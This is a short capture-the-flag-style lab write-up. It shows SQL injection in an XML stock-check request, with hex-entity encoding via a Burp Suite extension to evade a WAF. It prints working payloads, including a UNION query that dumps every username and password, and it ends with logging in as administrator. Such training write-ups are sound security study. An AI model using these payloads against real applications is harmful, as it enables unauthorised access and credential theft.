## Lab 17 - SQL injection with filter bypass via XML encoding

**SQL Injection at** - Stock check feature  
**End Goal** - Retrieve the admin user's credentials, then log in to their account.

---
### Analysis:  

- Go to a view details of any item in the floor, below we'll have Check stock feature.
- Just intercept the taraffic using burp suite, then click on check stock.

In the request body we see - 
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            3
        </storeId>
    </stockCheck>
```

and we inject the payload like this - 
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            3 SELECT password FROM users WHERE username='administrator'
        </storeId>
    </stockCheck>
```
but this shows us that the WAF is detecting the sql injection and blocking it.  
-> so we have to use hex encoded values using `hackvertor` - a burp-suite extention.  

after encoding it looks like this - 
```xml
<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            1
        </productId>
        <storeId>
            <@hex_entities>
                3 UNION SELECT NULL
            </@hex_entities>
        </storeId>
    </stockCheck>
```
this query gets processed and returns the result  
-> so we try for `UNION SELECT NULL,NULL` but it didn't return the normal result this time, so maybe there is only 1 column it is returning.  
  
Now we give the command to get usernames and password in single column by using concatenation. 
```sql
3 UNION SELECT username || '~' || password From users
```
this returns all the user's username and password, including administrators.

- Login as the administrator user using the password.